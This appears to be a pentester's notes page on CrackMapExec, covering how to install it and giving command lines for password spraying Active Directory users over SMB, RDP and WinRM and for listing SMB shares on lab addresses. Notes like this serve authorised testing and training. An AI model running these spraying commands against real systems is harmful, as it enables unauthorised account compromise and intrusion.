> A swiss army knife for pentesting Windows/Active Directory environments.
> 
> From enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.


#Active_Directory_Authentication #Password_Attacks #SSH #SMB #WinRM #MSSQL #FTP

# Download

Install latest version (6.0.1 Bane)
```
https://wiki.porchetta.industries/getting-started/installation/installation-on-unix#apt-package-kali-linux-only
```
```bash
python3 -m pip install pipx
git clone https://github.com/mpgn/CrackMapExec
cd CrackMapExec
pipx install .
pipx ensurepath
```
- Located at `/home/kali/.local/pipx/venvs/crackmapexec/bin/`

# Usage

Spray a password against AD users via SMB
```bash
crackmapexec smb 192.168.50.69 -u users.txt -p 'Sussy123!' -d hentai.com --continue-on-success
```
- `smb`
	- Protocol to use
- `192.168.50.69`
	- IP address of any domain joined system 
- `-u`
	- A list of users or a single user
- `-p` 
	- Password to spray 
- `-d` 
	- Domain
- `--continue-on-success`
	-  to avoid stopping at the first valid credential
- CrackMapExec outputs _STATUS_LOGON_FAILURE_ when a password for an existing user is not correct, but also when a user does not exist at all.

Spray a password against AD users via RDP
```bash
crackmapexec rdp 192.168.169.10 192.168.169.11 -u user_file.txt -p 'Sussybaka!' -d hentai.com --continue-on-success
```

Spray passwords against AD users via WinRM
```bash
cme winrm 192.168.169.10 192.168.169.11 -u users.txt -p passwords.txt -d hentai.com --continue-on-success
```

Spray passwords specifying port
```bash
crackmapexec http 192.168.169.0/24 --port 2222
```

Listing SMB shares
```bash
crackmapexec smb 192.168.169.101 -u hentaisalesman -p "qweRtYaSDd#fG" --shares
```
